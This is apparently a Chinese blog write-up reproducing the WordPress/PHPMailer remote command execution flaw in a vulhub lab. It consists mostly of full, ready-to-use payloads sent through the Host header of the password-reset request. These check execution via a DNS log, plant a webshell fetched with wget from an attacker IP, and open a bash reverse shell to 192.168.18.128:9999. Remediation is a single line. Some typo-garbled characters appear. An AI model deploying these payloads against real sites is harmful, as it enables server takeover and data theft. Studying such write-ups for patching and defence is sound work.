WordPress是使用PHP语言[开发](https://www.wangt.cc/tag/%E5%BC%80%E5%8F%91/)的博客平台，用户可以在支持PHP和MySQL[数据库](https://www.wangt.cc/tag/%E6%95%B0%E6%8D%AE%E5%BA%93/)的服务器上架设属于自己的网站。也可以把
WordPress当作一个内容管理系统（CMS）来使用。  
WordPress是一款个人博客系统，并逐步演化成一款内容管理系统软件，它是使用PHP语言和MySQL[数据库](https://www.wangt.cc/tag/%E6%95%B0%E6%8D%AE%E5%BA%93/)开发的，用户可以在支持
PHP 和
MySQL[数据库](https://www.wangt.cc/tag/%E6%95%B0%E6%8D%AE%E5%BA%93/)的服务器上使用自己的博客。  
WordPress有许多第三方[开发](https://www.wangt.cc/tag/%E5%BC%80%E5%8F%91/)的免费模板，[安装](https://www.wangt.cc/tag/%E5%AE%89%E8%A3%85/)方式简单易用。不过要做一个自己的模板，则需要你有一定的专业知识。比如你至少要懂的标准通用标记语言下的一个应用HTML代码、CSS、PHP等相关知识。  
WordPress官方支持中文版，同时有爱好者[开发](https://www.wangt.cc/tag/%E5%BC%80%E5%8F%91/)的第三方中文语言包，如wopus中文语言包。WordPress拥有成千上万个各式插件和不计其数的主题模板样式。

# 0x01 漏洞介绍

WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer(本
＜5,2.18)存在远程命令执行漏洞，攻击者只需巧炒地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危書。

沉洞利用条件：

不能包含特殊字符

命令需为小写

命令需使用绝对路径

需要知道现有用户名

注意点：命令只在服务器端执行命令、不会显示在容户端

# 0x02影响版本

WordPress <= 4.6 PHPMailer < 5.2.18

# 0x03 搭建环境

vulhub环境

# 0x04 漏洞复现

漏洞出现在管理员的密码重置界面/wp-login.php？action=lostpassword:

在找回密码时WordPress会使用PHPmailer发送重置密码的邮件，这个时候PHPmailer<=5.2.18时存在RCE

登录页点击忘记密码，在用户名或电子邮件地址输入框输入fhy666（我注册时填的是fhy666）。点击获取新密码，使用burp拦截抓包。

修改请求头Host的值：

payload：edi(any -froot@localhost -be
${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}curl${substr{10}{1}{$tod_log}}u4ljiq.dnslog.cn}}
null)

执行后发现dnslog接收，证明命令执行成功漏洞存在

创建一个success文件

    
    
    payload：aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)

![](https://image.3001.net/images/20220111/1641876801_61dd0d41725fab82b344d.png!small)  

已经创建成功

### 写入webshell

利用的是curl或wget命令下载远程文件，比如下载一个web[shell](https://www.wangt.cc/tag/shell/)，再用web[shell](https://www.wangt.cc/tag/shell/)[工具](https://www.wangt.cc/tag/%E5%B7%A5%E5%85%B7/)连接。注意：

  * 远程 URL 中不能有 http://
  * 所有字母必须小写

    
    
    payload：aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}shell.php${substr{10}{1}{$tod_log}}192.168.198.13${substr{0}{1}{$spool_directory}}1.txt}} null)

上面的pay[load](https://www.wangt.cc/tag/load/)意思是：从192.168.198.13这个地址，下载1.txt，保存到靶机的/var/www/html下，并命名为[shell](https://www.wangt.cc/tag/shell/).php。![](https://image.3001.net/images/20220111/1641876869_61dd0d85097c181b9c796.png!small)![](https://image.3001.net/images/20220111/1641876886_61dd0d965f349e774818c.png!small)![](https://image.3001.net/images/20220111/1641876899_61dd0da355c460897b29c.png!small)  

蚁剑成功连接，webshell写入成功。

### 反弹shell

利用的思想跟写入web[shell](https://www.wangt.cc/tag/shell/)差不多，是先使用curl或wget下载含有执行命令内容的文件，再通过命令执行达到反弹shell的目的。

利用步骤：

  1. 发送pay[load](https://www.wangt.cc/tag/load/)使靶机下载1.txt，并保存到/tmp/shell
  2. 在攻击机上监听9999端口

  3. 发送pay[load](https://www.wangt.cc/tag/load/)使靶机运行shell

将bash -i >& /dev/[tcp](https://www.wangt.cc/tag/tcp/)/192.168.18.128/9999
0>&1写入到攻击机1.txt中。

发送pay[load](https://www.wangt.cc/tag/load/)，下载1.txt到靶机/tmp/shell。

    
    
    payload：aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell${substr{10}{1}{$tod_log}}192.168.198.13${substr{0}{1}{$spool_directory}}1.txt}}null)

![](https://image.3001.net/images/20220111/1641876958_61dd0dde549da109b4829.png!small)  

攻击端监听9999端口。

发送payload运行shell：

    
    
    aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell}} null)

![](https://image.3001.net/images/20220111/1641876969_61dd0de9c41e68e5a56a6.png!small)  

## 漏洞修复

  * 更新[wordpress](https://www.wangt.cc/tag/wordpress/)、phpmailer到最新版本

